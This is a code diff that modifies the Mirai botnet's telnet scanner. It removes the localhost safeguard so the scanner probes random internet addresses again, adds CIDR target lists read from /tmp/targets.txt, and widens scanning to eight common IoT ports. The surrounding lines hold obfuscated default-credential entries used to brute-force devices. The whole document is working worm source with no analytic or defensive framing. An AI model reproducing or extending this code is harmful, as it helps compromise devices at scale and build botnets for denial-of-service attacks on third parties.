@@ -2,8 +2,9 @@
 
 #ifdef MIRAI_TELNET
 
-#ifdef DEBUG
 #include <stdio.h>
+#ifdef DEBUG
+// debug only
 #endif
 #include <unistd.h>
 #include <stdlib.h>
@@ -27,12 +28,26 @@
 #include "checksum.h"
 #include "resolv.h"
 
+#define SCAN_TARGETS_FILE   "/tmp/targets.txt"
+#define SCAN_MAX_TARGETS    256
+#define SCAN_MAX_PPS        200
+#define SCAN_PORT_COUNT     8
+
+static const uint16_t scan_ports[SCAN_PORT_COUNT] = {23, 2323, 80, 8080, 81, 5555, 7547, 8888};
+static uint32_t target_base[SCAN_MAX_TARGETS];
+static uint32_t target_count[SCAN_MAX_TARGETS];
+static uint32_t target_total = 0;
+static int target_loaded = 0;
+
 int scanner_pid, rsck, rsck_out, auth_table_len = 0;
 char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
 struct scanner_auth *auth_table = NULL;
 struct scanner_connection *conn_table;
 uint16_t auth_table_max_weight = 0;
 uint32_t fake_time = 0;
+
+static void load_targets(void);
+static ipv4_t get_random_ip(void);
 
 int recv_strip_null(int sock, void *buf, int len, int flags)
 {
@@ -54,6 +69,55 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
+static void load_targets(void)
+{
+    FILE *f = fopen(SCAN_TARGETS_FILE, "r");
+    if (!f)
+    {
+        target_loaded = 0;
+        return;
+    }
+
+    char line[128];
+    target_total = 0;
+
+    while (fgets(line, sizeof(line), f) && target_total < SCAN_MAX_TARGETS)
+    {
+        char *p = line;
+        while (*p == ' ' || *p == '\t') p++;
+
+        char *end = p;
+        while (*end && *end != '\n' && *end != '\r' && *end != '#' && *end != ' ' && *end != '\t') end++;
+        *end = 0;
+
+        if (*p == 0)
+            continue;
+
+        unsigned int a, b, c, d, n = 32;
+        int matched = sscanf(p, "%u.%u.%u.%u/%u", &a, &b, &c, &d, &n);
+        if (matched < 4)
+            continue;
+        if (matched == 4)
+            n = 32;
+        if (a > 255 || b > 255 || c > 255 || d > 255)
+            continue;
+        if (n < 8 || n > 32)
+            continue;
+
+        uint32_t base = ((uint32_t)a << 24) | ((uint32_t)b << 16) | ((uint32_t)c << 8) | (uint32_t)d;
+        uint32_t mask = (n == 32) ? 0xffffffffu : (0xffffffffu << (32 - n));
+        base &= mask;
+        uint32_t count = (n == 32) ? 1u : (uint32_t)(1ull << (32 - n));
+
+        target_base[target_total] = base;
+        target_count[target_total] = count;
+        target_total++;
+    }
+
+    fclose(f);
+    target_loaded = (target_total > 0) ? 1 : 0;
+}
+
 void scanner_init(void)
 {
     int i;
@@ -70,6 +134,7 @@ void scanner_init(void)
 
     rand_init();
     fake_time = time(NULL);
+    load_targets();
     conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
     for (i = 0; i < SCANNER_MAX_CONNS; i++)
     {
@@ -114,7 +179,7 @@ void scanner_init(void)
     iph->protocol = IPPROTO_TCP;
 
     // Set up TCP header
-    tcph->dest = htons(23);
+    tcph->dest = htons(scan_ports[0]);
     tcph->source = source_port;
     tcph->doff = 5;
     tcph->window = rand_next() & 0xffff;
@@ -184,7 +249,6 @@ void scanner_init(void)
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
     add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
 
-
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
@@ -207,6 +271,7 @@ void scanner_init(void)
                 struct sockaddr_in paddr = {0};
                 struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                 struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
+                uint16_t dst_port = scan_ports[rand_next() % SCAN_PORT_COUNT];
 
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
@@ -214,7 +279,7 @@ void scanner_init(void)
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
-                tcph->dest = htons(2323);
+                tcph->dest = htons(dst_port);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
                 tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
@@ -224,6 +289,9 @@ void scanner_init(void)
                 paddr.sin_port = tcph->dest;
 
                 sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
+
+                // Rate limit — cap em SCAN_MAX_PPS independente de SCANNER_RAW_PPS
+                usleep(1000000 / SCAN_MAX_PPS);
             }
         }
 
@@ -236,6 +304,7 @@ void scanner_init(void)
             struct iphdr *iph = (struct iphdr *)dgram;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             struct scanner_connection *conn;
+            int port_match = 0;
 
             errno = 0;
             n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
@@ -248,8 +317,19 @@ void scanner_init(void)
                 continue;
             if (iph->protocol != IPPROTO_TCP)
                 continue;
-            if (tcph->source != htons(2323))
+
+            // Aceita SYN-ACK de qualquer porta do array de scan
+            for (int p = 0; p < SCAN_PORT_COUNT; p++)
+            {
+                if (tcph->source == htons(scan_ports[p]))
+                {
+                    port_match = 1;
+                    break;
+                }
+            }
+            if (!port_match)
                 continue;
+
             if (tcph->dest != source_port)
                 continue;
             if (!tcph->syn)
@@ -666,33 +746,59 @@ static void setup_connection(struct scanner_connection *conn)
 
 static ipv4_t get_random_ip(void)
 {
-    return inet_addr("127.0.0.1");
-    uint32_t tmp;
-    uint8_t o1, o2, o3, o4;
-    do
+    // Se /tmp/targets.txt existe, scan dirigido por CIDR
+    if (target_loaded)
     {
-        tmp = rand_next();
-        o1 = tmp & 0xff;
-        o2 = (tmp >> 8) & 0xff;
-        o3 = (tmp >> 16) & 0xff;
-        o4 = (tmp >> 24) & 0xff;
-    }
-    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
-          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
-          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
-          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
-          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
-          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
-          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
-          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
-          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
-          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
-          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
-          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
-    );
+        int i;
+        uint32_t total = 0;
+        for (i = 0; i < target_total; i++)
+            total += target_count[i];
 
-    return INET_ADDR(o1,o2,o3,o4);
+        if (total == 0)
+            goto fallback_random;
+
+        uint32_t r = rand_next() % total;
+        uint32_t acc = 0;
+        for (i = 0; i < target_total; i++)
+        {
+            if (r < acc + target_count[i])
+            {
+                uint32_t offset = r - acc;
+                return htonl(target_base[i] + offset);
+            }
+            acc += target_count[i];
+        }
+    }
+
+fallback_random:
+    {
+        uint32_t tmp;
+        uint8_t o1, o2, o3, o4;
+        do
+        {
+            tmp = rand_next();
+            o1 = tmp & 0xff;
+            o2 = (tmp >> 8) & 0xff;
+            o3 = (tmp >> 16) & 0xff;
+            o4 = (tmp >> 24) & 0xff;
+        }
+        while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
+              (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
+              (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
+              (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
+              (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
+              (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+              (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
+              (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
+              (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
+              (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
+              (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
+              (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
+              (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
+        );
+
+        return INET_ADDR(o1,o2,o3,o4);
+    }
 }
 
 static int consume_iacs(struct scanner_connection *conn)
